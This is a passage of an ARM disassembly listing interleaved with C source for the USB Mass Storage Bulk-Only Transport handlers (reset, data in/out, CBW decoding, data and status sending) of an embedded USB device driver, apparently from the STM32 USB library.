void MSC_BOT_Reset(USBD_HandleTypeDef *pdev)
{
 8009318:	b580      	push	{r7, lr}
 800931a:	b084      	sub	sp, #16
 800931c:	af00      	add	r7, sp, #0
 800931e:	6078      	str	r0, [r7, #4]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009320:	687b      	ldr	r3, [r7, #4]
 8009322:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009326:	687b      	ldr	r3, [r7, #4]
 8009328:	32b0      	adds	r2, #176	; 0xb0
 800932a:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800932e:	60fb      	str	r3, [r7, #12]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 8009330:	68fb      	ldr	r3, [r7, #12]
 8009332:	2b00      	cmp	r3, #0
 8009334:	d01c      	beq.n	8009370 <MSC_BOT_Reset+0x58>
  {
    return;
  }

  hmsc->bot_state  = USBD_BOT_IDLE;
 8009336:	68fb      	ldr	r3, [r7, #12]
 8009338:	2200      	movs	r2, #0
 800933a:	721a      	strb	r2, [r3, #8]
  hmsc->bot_status = USBD_BOT_STATUS_RECOVERY;
 800933c:	68fb      	ldr	r3, [r7, #12]
 800933e:	2201      	movs	r2, #1
 8009340:	725a      	strb	r2, [r3, #9]

  (void)USBD_LL_ClearStallEP(pdev, MSCInEpAdd);
 8009342:	4b0d      	ldr	r3, [pc, #52]	; (8009378 <MSC_BOT_Reset+0x60>)
 8009344:	781b      	ldrb	r3, [r3, #0]
 8009346:	4619      	mov	r1, r3
 8009348:	6878      	ldr	r0, [r7, #4]
 800934a:	f003 fcc1 	bl	800ccd0 <USBD_LL_ClearStallEP>
  (void)USBD_LL_ClearStallEP(pdev, MSCOutEpAdd);
 800934e:	4b0b      	ldr	r3, [pc, #44]	; (800937c <MSC_BOT_Reset+0x64>)
 8009350:	781b      	ldrb	r3, [r3, #0]
 8009352:	4619      	mov	r1, r3
 8009354:	6878      	ldr	r0, [r7, #4]
 8009356:	f003 fcbb 	bl	800ccd0 <USBD_LL_ClearStallEP>

  /* Prepare EP to Receive First BOT Cmd */
  (void)USBD_LL_PrepareReceive(pdev, MSCOutEpAdd, (uint8_t *)&hmsc->cbw,
 800935a:	4b08      	ldr	r3, [pc, #32]	; (800937c <MSC_BOT_Reset+0x64>)
 800935c:	7819      	ldrb	r1, [r3, #0]
 800935e:	68fb      	ldr	r3, [r7, #12]
 8009360:	f503 5280 	add.w	r2, r3, #4096	; 0x1000
 8009364:	3210      	adds	r2, #16
 8009366:	231f      	movs	r3, #31
 8009368:	6878      	ldr	r0, [r7, #4]
 800936a:	f003 fd83 	bl	800ce74 <USBD_LL_PrepareReceive>
 800936e:	e000      	b.n	8009372 <MSC_BOT_Reset+0x5a>
    return;
 8009370:	bf00      	nop
                               USBD_BOT_CBW_LENGTH);
}
 8009372:	3710      	adds	r7, #16
 8009374:	46bd      	mov	sp, r7
 8009376:	bd80      	pop	{r7, pc}
 8009378:	2000010a 	.word	0x2000010a
 800937c:	2000010b 	.word	0x2000010b

08009380 <MSC_BOT_DeInit>:
  *         DeInitialize the BOT Machine
  * @param  pdev: device instance
  * @retval None
  */
void MSC_BOT_DeInit(USBD_HandleTypeDef  *pdev)
{
 8009380:	b480      	push	{r7}
 8009382:	b085      	sub	sp, #20
 8009384:	af00      	add	r7, sp, #0
 8009386:	6078      	str	r0, [r7, #4]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009388:	687b      	ldr	r3, [r7, #4]
 800938a:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800938e:	687b      	ldr	r3, [r7, #4]
 8009390:	32b0      	adds	r2, #176	; 0xb0
 8009392:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009396:	60fb      	str	r3, [r7, #12]

  if (hmsc != NULL)
 8009398:	68fb      	ldr	r3, [r7, #12]
 800939a:	2b00      	cmp	r3, #0
 800939c:	d002      	beq.n	80093a4 <MSC_BOT_DeInit+0x24>
  {
    hmsc->bot_state = USBD_BOT_IDLE;
 800939e:	68fb      	ldr	r3, [r7, #12]
 80093a0:	2200      	movs	r2, #0
 80093a2:	721a      	strb	r2, [r3, #8]
  }
}
 80093a4:	bf00      	nop
 80093a6:	3714      	adds	r7, #20
 80093a8:	46bd      	mov	sp, r7
 80093aa:	f85d 7b04 	ldr.w	r7, [sp], #4
 80093ae:	4770      	bx	lr

080093b0 <MSC_BOT_DataIn>:
  * @param  pdev: device instance
  * @param  epnum: endpoint index
  * @retval None
  */
void MSC_BOT_DataIn(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
 80093b0:	b580      	push	{r7, lr}
 80093b2:	b084      	sub	sp, #16
 80093b4:	af00      	add	r7, sp, #0
 80093b6:	6078      	str	r0, [r7, #4]
 80093b8:	460b      	mov	r3, r1
 80093ba:	70fb      	strb	r3, [r7, #3]
  UNUSED(epnum);

  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 80093bc:	687b      	ldr	r3, [r7, #4]
 80093be:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80093c2:	687b      	ldr	r3, [r7, #4]
 80093c4:	32b0      	adds	r2, #176	; 0xb0
 80093c6:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 80093ca:	60fb      	str	r3, [r7, #12]

  if (hmsc == NULL)
 80093cc:	68fb      	ldr	r3, [r7, #12]
 80093ce:	2b00      	cmp	r3, #0
 80093d0:	d022      	beq.n	8009418 <MSC_BOT_DataIn+0x68>
  {
    return;
  }

  switch (hmsc->bot_state)
 80093d2:	68fb      	ldr	r3, [r7, #12]
 80093d4:	7a1b      	ldrb	r3, [r3, #8]
 80093d6:	2b02      	cmp	r3, #2
 80093d8:	d005      	beq.n	80093e6 <MSC_BOT_DataIn+0x36>
 80093da:	2b02      	cmp	r3, #2
 80093dc:	db1e      	blt.n	800941c <MSC_BOT_DataIn+0x6c>
 80093de:	3b03      	subs	r3, #3
 80093e0:	2b01      	cmp	r3, #1
 80093e2:	d81b      	bhi.n	800941c <MSC_BOT_DataIn+0x6c>
 80093e4:	e013      	b.n	800940e <MSC_BOT_DataIn+0x5e>
  {
    case USBD_BOT_DATA_IN:
      if (SCSI_ProcessCmd(pdev, hmsc->cbw.bLUN, &hmsc->cbw.CB[0]) < 0)
 80093e6:	68fb      	ldr	r3, [r7, #12]
 80093e8:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80093ec:	7f59      	ldrb	r1, [r3, #29]
 80093ee:	68fb      	ldr	r3, [r7, #12]
 80093f0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80093f4:	331f      	adds	r3, #31
 80093f6:	461a      	mov	r2, r3
 80093f8:	6878      	ldr	r0, [r7, #4]
 80093fa:	f000 f9e5 	bl	80097c8 <SCSI_ProcessCmd>
 80093fe:	4603      	mov	r3, r0
 8009400:	2b00      	cmp	r3, #0
 8009402:	da0d      	bge.n	8009420 <MSC_BOT_DataIn+0x70>
      {
        MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_FAILED);
 8009404:	2101      	movs	r1, #1
 8009406:	6878      	ldr	r0, [r7, #4]
 8009408:	f000 f920 	bl	800964c <MSC_BOT_SendCSW>
      }
      break;
 800940c:	e008      	b.n	8009420 <MSC_BOT_DataIn+0x70>

    case USBD_BOT_SEND_DATA:
    case USBD_BOT_LAST_DATA_IN:
      MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_PASSED);
 800940e:	2100      	movs	r1, #0
 8009410:	6878      	ldr	r0, [r7, #4]
 8009412:	f000 f91b 	bl	800964c <MSC_BOT_SendCSW>
      break;
 8009416:	e004      	b.n	8009422 <MSC_BOT_DataIn+0x72>
    return;
 8009418:	bf00      	nop
 800941a:	e002      	b.n	8009422 <MSC_BOT_DataIn+0x72>

    default:
      break;
 800941c:	bf00      	nop
 800941e:	e000      	b.n	8009422 <MSC_BOT_DataIn+0x72>
      break;
 8009420:	bf00      	nop
  }
}
 8009422:	3710      	adds	r7, #16
 8009424:	46bd      	mov	sp, r7
 8009426:	bd80      	pop	{r7, pc}

08009428 <MSC_BOT_DataOut>:
  * @param  pdev: device instance
  * @param  epnum: endpoint index
  * @retval None
  */
void MSC_BOT_DataOut(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
 8009428:	b580      	push	{r7, lr}
 800942a:	b084      	sub	sp, #16
 800942c:	af00      	add	r7, sp, #0
 800942e:	6078      	str	r0, [r7, #4]
 8009430:	460b      	mov	r3, r1
 8009432:	70fb      	strb	r3, [r7, #3]
  UNUSED(epnum);

  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009434:	687b      	ldr	r3, [r7, #4]
 8009436:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800943a:	687b      	ldr	r3, [r7, #4]
 800943c:	32b0      	adds	r2, #176	; 0xb0
 800943e:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009442:	60fb      	str	r3, [r7, #12]

  if (hmsc == NULL)
 8009444:	68fb      	ldr	r3, [r7, #12]
 8009446:	2b00      	cmp	r3, #0
 8009448:	d01e      	beq.n	8009488 <MSC_BOT_DataOut+0x60>
  {
    return;
  }

  switch (hmsc->bot_state)
 800944a:	68fb      	ldr	r3, [r7, #12]
 800944c:	7a1b      	ldrb	r3, [r3, #8]
 800944e:	2b00      	cmp	r3, #0
 8009450:	d002      	beq.n	8009458 <MSC_BOT_DataOut+0x30>
 8009452:	2b01      	cmp	r3, #1
 8009454:	d004      	beq.n	8009460 <MSC_BOT_DataOut+0x38>
        MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_FAILED);
      }
      break;

    default:
      break;
 8009456:	e01a      	b.n	800948e <MSC_BOT_DataOut+0x66>
      MSC_BOT_CBW_Decode(pdev);
 8009458:	6878      	ldr	r0, [r7, #4]
 800945a:	f000 f81b 	bl	8009494 <MSC_BOT_CBW_Decode>
      break;
 800945e:	e016      	b.n	800948e <MSC_BOT_DataOut+0x66>
      if (SCSI_ProcessCmd(pdev, hmsc->cbw.bLUN, &hmsc->cbw.CB[0]) < 0)
 8009460:	68fb      	ldr	r3, [r7, #12]
 8009462:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009466:	7f59      	ldrb	r1, [r3, #29]
 8009468:	68fb      	ldr	r3, [r7, #12]
 800946a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800946e:	331f      	adds	r3, #31
 8009470:	461a      	mov	r2, r3
 8009472:	6878      	ldr	r0, [r7, #4]
 8009474:	f000 f9a8 	bl	80097c8 <SCSI_ProcessCmd>
 8009478:	4603      	mov	r3, r0
 800947a:	2b00      	cmp	r3, #0
 800947c:	da06      	bge.n	800948c <MSC_BOT_DataOut+0x64>
        MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_FAILED);
 800947e:	2101      	movs	r1, #1
 8009480:	6878      	ldr	r0, [r7, #4]
 8009482:	f000 f8e3 	bl	800964c <MSC_BOT_SendCSW>
      break;
 8009486:	e001      	b.n	800948c <MSC_BOT_DataOut+0x64>
    return;
 8009488:	bf00      	nop
 800948a:	e000      	b.n	800948e <MSC_BOT_DataOut+0x66>
      break;
 800948c:	bf00      	nop
  }
}
 800948e:	3710      	adds	r7, #16
 8009490:	46bd      	mov	sp, r7
 8009492:	bd80      	pop	{r7, pc}

08009494 <MSC_BOT_CBW_Decode>:
  *         Decode the CBW command and set the BOT state machine accordingly
  * @param  pdev: device instance
  * @retval None
  */
static void  MSC_BOT_CBW_Decode(USBD_HandleTypeDef *pdev)
{
 8009494:	b580      	push	{r7, lr}
 8009496:	b084      	sub	sp, #16
 8009498:	af00      	add	r7, sp, #0
 800949a:	6078      	str	r0, [r7, #4]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800949c:	687b      	ldr	r3, [r7, #4]
 800949e:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80094a2:	687b      	ldr	r3, [r7, #4]
 80094a4:	32b0      	adds	r2, #176	; 0xb0
 80094a6:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 80094aa:	60fb      	str	r3, [r7, #12]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 80094ac:	68fb      	ldr	r3, [r7, #12]
 80094ae:	2b00      	cmp	r3, #0
 80094b0:	f000 8085 	beq.w	80095be <MSC_BOT_CBW_Decode+0x12a>
  {
    return;
  }

  hmsc->csw.dTag = hmsc->cbw.dTag;
 80094b4:	68fb      	ldr	r3, [r7, #12]
 80094b6:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80094ba:	695b      	ldr	r3, [r3, #20]
 80094bc:	68fa      	ldr	r2, [r7, #12]
 80094be:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 80094c2:	6353      	str	r3, [r2, #52]	; 0x34
  hmsc->csw.dDataResidue = hmsc->cbw.dDataLength;
 80094c4:	68fb      	ldr	r3, [r7, #12]
 80094c6:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80094ca:	699b      	ldr	r3, [r3, #24]
 80094cc:	68fa      	ldr	r2, [r7, #12]
 80094ce:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 80094d2:	6393      	str	r3, [r2, #56]	; 0x38

  if ((USBD_LL_GetRxDataSize(pdev, MSCOutEpAdd) != USBD_BOT_CBW_LENGTH) ||
 80094d4:	4b3d      	ldr	r3, [pc, #244]	; (80095cc <MSC_BOT_CBW_Decode+0x138>)
 80094d6:	781b      	ldrb	r3, [r3, #0]
 80094d8:	4619      	mov	r1, r3
 80094da:	6878      	ldr	r0, [r7, #4]
 80094dc:	f003 fd02 	bl	800cee4 <USBD_LL_GetRxDataSize>
 80094e0:	4603      	mov	r3, r0
 80094e2:	2b1f      	cmp	r3, #31
 80094e4:	d118      	bne.n	8009518 <MSC_BOT_CBW_Decode+0x84>
      (hmsc->cbw.dSignature != USBD_BOT_CBW_SIGNATURE) ||
 80094e6:	68fb      	ldr	r3, [r7, #12]
 80094e8:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80094ec:	691b      	ldr	r3, [r3, #16]
  if ((USBD_LL_GetRxDataSize(pdev, MSCOutEpAdd) != USBD_BOT_CBW_LENGTH) ||
 80094ee:	4a38      	ldr	r2, [pc, #224]	; (80095d0 <MSC_BOT_CBW_Decode+0x13c>)
 80094f0:	4293      	cmp	r3, r2
 80094f2:	d111      	bne.n	8009518 <MSC_BOT_CBW_Decode+0x84>
      (hmsc->cbw.bLUN > 1U) || (hmsc->cbw.bCBLength < 1U) ||
 80094f4:	68fb      	ldr	r3, [r7, #12]
 80094f6:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80094fa:	7f5b      	ldrb	r3, [r3, #29]
      (hmsc->cbw.dSignature != USBD_BOT_CBW_SIGNATURE) ||
 80094fc:	2b01      	cmp	r3, #1
 80094fe:	d80b      	bhi.n	8009518 <MSC_BOT_CBW_Decode+0x84>
      (hmsc->cbw.bLUN > 1U) || (hmsc->cbw.bCBLength < 1U) ||
 8009500:	68fb      	ldr	r3, [r7, #12]
 8009502:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009506:	7f9b      	ldrb	r3, [r3, #30]
 8009508:	2b00      	cmp	r3, #0
 800950a:	d005      	beq.n	8009518 <MSC_BOT_CBW_Decode+0x84>
      (hmsc->cbw.bCBLength > 16U))
 800950c:	68fb      	ldr	r3, [r7, #12]
 800950e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009512:	7f9b      	ldrb	r3, [r3, #30]
      (hmsc->cbw.bLUN > 1U) || (hmsc->cbw.bCBLength < 1U) ||
 8009514:	2b10      	cmp	r3, #16
 8009516:	d90f      	bls.n	8009538 <MSC_BOT_CBW_Decode+0xa4>
  {
    SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 8009518:	68fb      	ldr	r3, [r7, #12]
 800951a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800951e:	7f59      	ldrb	r1, [r3, #29]
 8009520:	2320      	movs	r3, #32
 8009522:	2205      	movs	r2, #5
 8009524:	6878      	ldr	r0, [r7, #4]
 8009526:	f000 fe7b 	bl	800a220 <SCSI_SenseCode>

    hmsc->bot_status = USBD_BOT_STATUS_ERROR;
 800952a:	68fb      	ldr	r3, [r7, #12]
 800952c:	2202      	movs	r2, #2
 800952e:	725a      	strb	r2, [r3, #9]
    MSC_BOT_Abort(pdev);
 8009530:	6878      	ldr	r0, [r7, #4]
 8009532:	f000 f8cb 	bl	80096cc <MSC_BOT_Abort>
 8009536:	e045      	b.n	80095c4 <MSC_BOT_CBW_Decode+0x130>
  }
  else
  {
    if (SCSI_ProcessCmd(pdev, hmsc->cbw.bLUN, &hmsc->cbw.CB[0]) < 0)
 8009538:	68fb      	ldr	r3, [r7, #12]
 800953a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800953e:	7f59      	ldrb	r1, [r3, #29]
 8009540:	68fb      	ldr	r3, [r7, #12]
 8009542:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009546:	331f      	adds	r3, #31
 8009548:	461a      	mov	r2, r3
 800954a:	6878      	ldr	r0, [r7, #4]
 800954c:	f000 f93c 	bl	80097c8 <SCSI_ProcessCmd>
 8009550:	4603      	mov	r3, r0
 8009552:	2b00      	cmp	r3, #0
 8009554:	da0c      	bge.n	8009570 <MSC_BOT_CBW_Decode+0xdc>
    {
      if (hmsc->bot_state == USBD_BOT_NO_DATA)
 8009556:	68fb      	ldr	r3, [r7, #12]
 8009558:	7a1b      	ldrb	r3, [r3, #8]
 800955a:	2b05      	cmp	r3, #5
 800955c:	d104      	bne.n	8009568 <MSC_BOT_CBW_Decode+0xd4>
      {
        MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_FAILED);
 800955e:	2101      	movs	r1, #1
 8009560:	6878      	ldr	r0, [r7, #4]
 8009562:	f000 f873 	bl	800964c <MSC_BOT_SendCSW>
 8009566:	e02d      	b.n	80095c4 <MSC_BOT_CBW_Decode+0x130>
      }
      else
      {
        MSC_BOT_Abort(pdev);
 8009568:	6878      	ldr	r0, [r7, #4]
 800956a:	f000 f8af 	bl	80096cc <MSC_BOT_Abort>
 800956e:	e029      	b.n	80095c4 <MSC_BOT_CBW_Decode+0x130>
      }
    }
    /* Burst xfer handled internally */
    else if ((hmsc->bot_state != USBD_BOT_DATA_IN) &&
 8009570:	68fb      	ldr	r3, [r7, #12]
 8009572:	7a1b      	ldrb	r3, [r3, #8]
 8009574:	2b02      	cmp	r3, #2
 8009576:	d024      	beq.n	80095c2 <MSC_BOT_CBW_Decode+0x12e>
             (hmsc->bot_state != USBD_BOT_DATA_OUT) &&
 8009578:	68fb      	ldr	r3, [r7, #12]
 800957a:	7a1b      	ldrb	r3, [r3, #8]
    else if ((hmsc->bot_state != USBD_BOT_DATA_IN) &&
 800957c:	2b01      	cmp	r3, #1
 800957e:	d020      	beq.n	80095c2 <MSC_BOT_CBW_Decode+0x12e>
             (hmsc->bot_state != USBD_BOT_LAST_DATA_IN))
 8009580:	68fb      	ldr	r3, [r7, #12]
 8009582:	7a1b      	ldrb	r3, [r3, #8]
             (hmsc->bot_state != USBD_BOT_DATA_OUT) &&
 8009584:	2b03      	cmp	r3, #3
 8009586:	d01c      	beq.n	80095c2 <MSC_BOT_CBW_Decode+0x12e>
    {
      if (hmsc->bot_data_length > 0U)
 8009588:	68fb      	ldr	r3, [r7, #12]
 800958a:	68db      	ldr	r3, [r3, #12]
 800958c:	2b00      	cmp	r3, #0
 800958e:	d009      	beq.n	80095a4 <MSC_BOT_CBW_Decode+0x110>
      {
        MSC_BOT_SendData(pdev, hmsc->bot_data, hmsc->bot_data_length);
 8009590:	68fb      	ldr	r3, [r7, #12]
 8009592:	f103 0110 	add.w	r1, r3, #16
 8009596:	68fb      	ldr	r3, [r7, #12]
 8009598:	68db      	ldr	r3, [r3, #12]
 800959a:	461a      	mov	r2, r3
 800959c:	6878      	ldr	r0, [r7, #4]
 800959e:	f000 f819 	bl	80095d4 <MSC_BOT_SendData>
      if (hmsc->bot_data_length > 0U)
 80095a2:	e00f      	b.n	80095c4 <MSC_BOT_CBW_Decode+0x130>
      }
      else if (hmsc->bot_data_length == 0U)
 80095a4:	68fb      	ldr	r3, [r7, #12]
 80095a6:	68db      	ldr	r3, [r3, #12]
 80095a8:	2b00      	cmp	r3, #0
 80095aa:	d104      	bne.n	80095b6 <MSC_BOT_CBW_Decode+0x122>
      {
        MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_PASSED);
 80095ac:	2100      	movs	r1, #0
 80095ae:	6878      	ldr	r0, [r7, #4]
 80095b0:	f000 f84c 	bl	800964c <MSC_BOT_SendCSW>
      if (hmsc->bot_data_length > 0U)
 80095b4:	e006      	b.n	80095c4 <MSC_BOT_CBW_Decode+0x130>
      }
      else
      {
        MSC_BOT_Abort(pdev);
 80095b6:	6878      	ldr	r0, [r7, #4]
 80095b8:	f000 f888 	bl	80096cc <MSC_BOT_Abort>
      if (hmsc->bot_data_length > 0U)
 80095bc:	e002      	b.n	80095c4 <MSC_BOT_CBW_Decode+0x130>
    return;
 80095be:	bf00      	nop
 80095c0:	e000      	b.n	80095c4 <MSC_BOT_CBW_Decode+0x130>
      }
    }
    else
    {
      return;
 80095c2:	bf00      	nop
    }
  }
}
 80095c4:	3710      	adds	r7, #16
 80095c6:	46bd      	mov	sp, r7
 80095c8:	bd80      	pop	{r7, pc}
 80095ca:	bf00      	nop
 80095cc:	2000010b 	.word	0x2000010b
 80095d0:	43425355 	.word	0x43425355

080095d4 <MSC_BOT_SendData>:
  * @param  buf: pointer to data buffer
  * @param  len: Data Length
  * @retval None
  */
static void  MSC_BOT_SendData(USBD_HandleTypeDef *pdev, uint8_t *pbuf, uint32_t len)
{
 80095d4:	b580      	push	{r7, lr}
 80095d6:	b086      	sub	sp, #24
 80095d8:	af00      	add	r7, sp, #0
 80095da:	60f8      	str	r0, [r7, #12]
 80095dc:	60b9      	str	r1, [r7, #8]
 80095de:	607a      	str	r2, [r7, #4]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 80095e0:	68fb      	ldr	r3, [r7, #12]
 80095e2:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80095e6:	68fb      	ldr	r3, [r7, #12]
 80095e8:	32b0      	adds	r2, #176	; 0xb0
 80095ea:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 80095ee:	617b      	str	r3, [r7, #20]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 80095f0:	697b      	ldr	r3, [r7, #20]
 80095f2:	2b00      	cmp	r3, #0
 80095f4:	d023      	beq.n	800963e <MSC_BOT_SendData+0x6a>
  {
    return;
  }

  length = MIN(hmsc->cbw.dDataLength, len);
 80095f6:	697b      	ldr	r3, [r7, #20]
 80095f8:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80095fc:	699b      	ldr	r3, [r3, #24]
 80095fe:	687a      	ldr	r2, [r7, #4]
 8009600:	4293      	cmp	r3, r2
 8009602:	bf28      	it	cs
 8009604:	4613      	movcs	r3, r2
 8009606:	613b      	str	r3, [r7, #16]

  hmsc->csw.dDataResidue -= len;
 8009608:	697b      	ldr	r3, [r7, #20]
 800960a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800960e:	6b9a      	ldr	r2, [r3, #56]	; 0x38
 8009610:	687b      	ldr	r3, [r7, #4]
 8009612:	1ad3      	subs	r3, r2, r3
 8009614:	697a      	ldr	r2, [r7, #20]
 8009616:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800961a:	6393      	str	r3, [r2, #56]	; 0x38
  hmsc->csw.bStatus = USBD_CSW_CMD_PASSED;
 800961c:	697b      	ldr	r3, [r7, #20]
 800961e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009622:	2200      	movs	r2, #0
 8009624:	f883 203c 	strb.w	r2, [r3, #60]	; 0x3c
  hmsc->bot_state = USBD_BOT_SEND_DATA;
 8009628:	697b      	ldr	r3, [r7, #20]
 800962a:	2204      	movs	r2, #4
 800962c:	721a      	strb	r2, [r3, #8]

  (void)USBD_LL_Transmit(pdev, MSCInEpAdd, pbuf, length);
 800962e:	4b06      	ldr	r3, [pc, #24]	; (8009648 <MSC_BOT_SendData+0x74>)
 8009630:	7819      	ldrb	r1, [r3, #0]
 8009632:	693b      	ldr	r3, [r7, #16]
 8009634:	68ba      	ldr	r2, [r7, #8]
 8009636:	68f8      	ldr	r0, [r7, #12]
 8009638:	f003 fbe4 	bl	800ce04 <USBD_LL_Transmit>
 800963c:	e000      	b.n	8009640 <MSC_BOT_SendData+0x6c>
    return;
 800963e:	bf00      	nop
}
 8009640:	3718      	adds	r7, #24
 8009642:	46bd      	mov	sp, r7
 8009644:	bd80      	pop	{r7, pc}
 8009646:	bf00      	nop
 8009648:	2000010a 	.word	0x2000010a

0800964c <MSC_BOT_SendCSW>:
  * @param  pdev: device instance
  * @param  status : CSW status
  * @retval None
  */
void  MSC_BOT_SendCSW(USBD_HandleTypeDef *pdev, uint8_t CSW_Status)
{
 800964c:	b580      	push	{r7, lr}
 800964e:	b084      	sub	sp, #16
 8009650:	af00      	add	r7, sp, #0
 8009652:	6078      	str	r0, [r7, #4]
 8009654:	460b      	mov	r3, r1
 8009656:	70fb      	strb	r3, [r7, #3]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009658:	687b      	ldr	r3, [r7, #4]
 800965a:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800965e:	687b      	ldr	r3, [r7, #4]
 8009660:	32b0      	adds	r2, #176	; 0xb0
 8009662:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009666:	60fb      	str	r3, [r7, #12]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 8009668:	68fb      	ldr	r3, [r7, #12]
 800966a:	2b00      	cmp	r3, #0
 800966c:	d024      	beq.n	80096b8 <MSC_BOT_SendCSW+0x6c>
  {
    return;
  }

  hmsc->csw.dSignature = USBD_BOT_CSW_SIGNATURE;
 800966e:	68fb      	ldr	r3, [r7, #12]
 8009670:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009674:	461a      	mov	r2, r3
 8009676:	4b12      	ldr	r3, [pc, #72]	; (80096c0 <MSC_BOT_SendCSW+0x74>)
 8009678:	6313      	str	r3, [r2, #48]	; 0x30
  hmsc->csw.bStatus = CSW_Status;
 800967a:	68fb      	ldr	r3, [r7, #12]
 800967c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009680:	461a      	mov	r2, r3
 8009682:	78fb      	ldrb	r3, [r7, #3]
 8009684:	f882 303c 	strb.w	r3, [r2, #60]	; 0x3c
  hmsc->bot_state = USBD_BOT_IDLE;
 8009688:	68fb      	ldr	r3, [r7, #12]
 800968a:	2200      	movs	r2, #0
 800968c:	721a      	strb	r2, [r3, #8]

  (void)USBD_LL_Transmit(pdev, MSCInEpAdd, (uint8_t *)&hmsc->csw,
 800968e:	4b0d      	ldr	r3, [pc, #52]	; (80096c4 <MSC_BOT_SendCSW+0x78>)
 8009690:	7819      	ldrb	r1, [r3, #0]
 8009692:	68fb      	ldr	r3, [r7, #12]
 8009694:	f503 5281 	add.w	r2, r3, #4128	; 0x1020
 8009698:	3210      	adds	r2, #16
 800969a:	230d      	movs	r3, #13
 800969c:	6878      	ldr	r0, [r7, #4]
 800969e:	f003 fbb1 	bl	800ce04 <USBD_LL_Transmit>
                         USBD_BOT_CSW_LENGTH);

  /* Prepare EP to Receive next Cmd */
  (void)USBD_LL_PrepareReceive(pdev, MSCOutEpAdd, (uint8_t *)&hmsc->cbw,
